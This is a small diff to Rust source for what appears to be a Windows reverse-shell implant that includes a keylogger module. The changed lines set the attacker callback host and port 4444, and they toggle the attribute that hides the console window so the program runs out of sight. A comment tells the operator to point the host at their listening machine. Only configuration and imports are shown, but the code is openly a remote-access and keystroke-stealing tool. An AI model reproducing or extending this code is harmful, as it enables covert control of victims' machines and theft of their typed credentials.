@@ -1,4 +1,4 @@
-#![windows_subsystem = "windows"]
+//#![windows_subsystem = "windows"]
 
 use std::net::TcpStream;
 use std::process::{Command, Stdio};
@@ -15,7 +15,7 @@ use std::os::windows::process::CommandExt;
 
 pub mod keylogger;
 
-const REMOTE_HOST: &str = "192.168.1.154"; // Change this to the IP of your listening machine
+const REMOTE_HOST: &str = "127.0.0.1"; // Change this to the IP of your listening machine
 const REMOTE_PORT: u16 = 4444;        // Change this to your listening port
 const RETRY_DELAY: Duration = Duration::from_secs(5); // Wait 5 seconds between reconnection attempts
 
